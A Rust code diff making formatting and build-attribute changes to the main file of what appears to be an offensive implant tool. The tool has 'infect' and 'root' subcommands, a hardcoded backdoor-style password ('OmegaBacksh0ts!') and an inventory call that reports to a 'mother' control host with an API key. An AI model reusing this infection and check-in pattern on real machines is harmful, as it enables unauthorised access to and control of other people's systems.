@@ -1,5 +1,6 @@
 pub mod client;
-use crate::client::types::{Host, Infect,  OS};
+use crate::client::types::{Host, Infect, OS};
+#[cfg(target_os = "linux")]
 use crate::client::utils::{install_docker, install_serial_scripter};
 
 use clap::{arg, command, value_parser, Command};
@@ -71,8 +72,6 @@ async fn main() {
                 Ok(_) => println!("Infect operation successful"),
                 Err(_) => println!("Infect operation failed"),
             }
-
-            
         }
         Some(("root", sub_matches)) => {
             let lifetime = sub_matches.get_one::<u8>("lifetime").unwrap();
@@ -89,11 +88,8 @@ async fn main() {
 
             let host = Host::new();
             host.infect(69, "OmegaBacksh0ts!");
-            host
-                .inventory(&mother_ip.to_string(), &api_key)
-                .await;
+            host.inventory(&mother_ip.to_string(), &api_key).await;
         }
         _ => {}
     }
 }
-
